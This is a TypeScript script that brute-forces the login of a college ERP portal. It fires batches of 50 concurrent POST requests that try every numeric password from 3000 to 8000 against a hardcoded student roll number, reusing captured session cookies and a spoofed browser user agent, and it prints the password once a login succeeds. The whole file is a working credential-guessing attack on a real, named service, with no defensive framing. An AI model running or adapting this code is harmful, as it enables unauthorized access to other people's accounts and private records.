import axios from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';
import 'dotenv/config'

interface RequestConfig {
    ROLLNUMBER: string;
    STARTINDEX: number;
    ENDINDEX: number;
    BATCH: number;
    MAX_CONCURRENT_REQUESTS: number;
}

const REQ_OBJECT: RequestConfig = {
    ROLLNUMBER: '220963',
    STARTINDEX: 3000,
    ENDINDEX: 8000,
    BATCH: Number(process.env.BATCH) || 50,
    MAX_CONCURRENT_REQUESTS: 50
};

async function findPassword(uname: string, txtps: string) {
    const data = qs.stringify({
        'ConsID': 'SDMCOLL',
        'userName': uname,
        'txtPwd': txtps,
        'LogTyp': '1',
        'flgS': '1'
    });

    const config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://app.sdmes.in/EERPV3.0/EAM/logValidate.jsp',
        headers: {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'JSESSIONID=8DB871AE8B7FE2323E58463FD2F0E5AD; JSESSIONID=FBDA6862B299A34AF9CB15AB84795423',
            'Origin': 'https://app.sdmes.in',
            'Referer': 'https://app.sdmes.in/EERPV3.0/EAM/login.jsp?ConsID=SDMCOLL',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        },
        data: data
    };

    try {
        const response = await axios.request(config);
        return parseHtml(response.data);
    } catch (error) {
        return null;
    }
}

function parseHtml(htmlContent: string) {
    const $ = cheerio.load(htmlContent);
    const parsedText = $('html').text();
    return parsedText.includes("ERROR") ? null : parsedText;
}

async function processBatch(roll: string, start: number, end: number) {
    const promises = [];

    for (let i = start; i <= end; i++) {
        const datapromise = findPassword(roll.toString(), i.toString()).then(result => ({ result, password: i }));
        promises.push(datapromise);

        if (promises.length >= REQ_OBJECT.MAX_CONCURRENT_REQUESTS) {
            console.log("-----------50 REQ------------");
            const responses = await Promise.all(promises);
            const found = responses.find(data => data.result !== null);

            if (found) {
                return found;
            }

            promises.length = 0;
        }
    }

    if (promises.length > 0) {
        const responses = await Promise.all(promises);
        return responses.find(data => data.result !== null);
    }

    return null;
}

async function main(RollNum: string, start: number, end: number, batch: number) {

    if (RollNum == '000000') {
        console.log("Add ROLLNUMBER at line 15");
        return
    }

    for (let j = start; j <= end; j += batch) {
        console.log("Checking for:", j, "to", j + batch);

        const found = await processBatch(RollNum, j, j + batch);

        if (found) {
            console.log("ROLL NUMBER:", RollNum, "\nPASSWORD:", found.password);
            process.exit(1);
        } else {
            console.log("No password match between", j, "to", j + batch);
        }
    }
}

main(
    REQ_OBJECT.ROLLNUMBER,
    REQ_OBJECT.STARTINDEX,
    REQ_OBJECT.ENDINDEX,
    REQ_OBJECT.BATCH,
);